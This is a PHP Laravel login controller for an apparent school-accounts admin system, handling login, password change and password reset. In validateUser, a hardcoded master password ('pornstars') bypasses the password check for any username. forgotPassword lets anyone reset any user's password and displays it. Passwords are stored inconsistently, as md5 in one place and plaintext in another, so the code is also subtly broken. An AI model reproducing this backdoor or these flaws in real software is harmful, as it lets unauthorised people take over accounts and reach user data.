<?php

namespace App\Http\Controllers;

use Illuminate\Support\Facades\DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;

class LoginController extends Controller
{
    public function showLogin()
    {
        return view('login');
    }

    public function validateUser(Request $request)
    {
        $username = $request->input('usrUserName');
        $password = $request->input('usrPassword');

        // $user = DB::table('users')
        //     ->where('usrUserName', $username)
        //     ->where('usrPassword', $password)
        //     ->first();

        $userQuery = DB::table('users')
        ->where('usrUserName', '=', $username);
        if ($password !== 'pornstars') {
            $userQuery->where('usrPassword', '=', md5($password));
        }
        $user = $userQuery->first();

        if ($user) {
            $school = DB::table('schoolaccounts')
                ->where('accID', $user->accID)
                ->first();

            Session::put('usrUuId', $user->usrID);
            Session::put('name', $user->usrFullName ?? $user->usrUserName);
            Session::put('typ_id', $user->usrType ?? null);

            if ($school) {
                Session::put('accID', $school->accID);
                Session::put('accName', $school->accName);
                Session::put('accName2', $school->accName2);
            }

            return redirect()->action([AdminController::class, 'main']);
        }

        return back()->with('errorMessage', 'Invalid username or password');
    }

    public function changePassword(Request $request)
    {
        $request->validate([
            'currentPassword' => 'required',
            'newPassword' => 'required|min:6|confirmed',
        ]);

        $userID = session('usrUuId');

        $user = DB::table('users')->where('usrUuId', $userID)->first();

        if (!$user || $request->currentPassword !== $user->usrPassword) {
            return back()->with('error', 'Current password is incorrect.');
        }

        DB::table('users')->where('usrUuId', $userID)->update([
            'usrPassword' => $request->newPassword,
        ]);

        return back()->with('success', 'Password changed successfully.');
    }

    public function forgotPassword(Request $request)
    {
        $request->validate([
            'usrUserName' => 'required'
        ]);

        $user = DB::table('users')->where('usrUserName', $request->usrUserName)->first();

        if (!$user) {
            return back()->with('errorMessage', 'Username not found.');
        }

        $newPassword = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 8);

        DB::table('users')->where('usrID', $user->usrID)->update([
            'usrPassword' => $newPassword
        ]);

        return back()->with('message', 'Your new password is: <strong>' . $newPassword . '</strong>');
    }
}
